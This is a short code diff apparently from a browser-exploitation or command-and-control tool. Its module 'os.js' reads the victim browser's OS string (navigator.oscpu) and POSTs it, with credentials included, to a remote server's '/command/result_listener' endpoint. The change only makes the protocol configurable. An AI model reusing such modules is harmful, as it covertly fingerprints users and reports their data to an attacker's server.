@@ -8,7 +8,7 @@ Grabbing the user OS
     formData.append('result', navigator.oscpu)
     formData.append('module_value', 'os.js')
 
-    fetch(`http://${server}/command/result_listener`, {
+    fetch(`${protocol}://${server}/command/result_listener`, {
         method: "POST",
         mode: 'cors',
         credentials: "include",
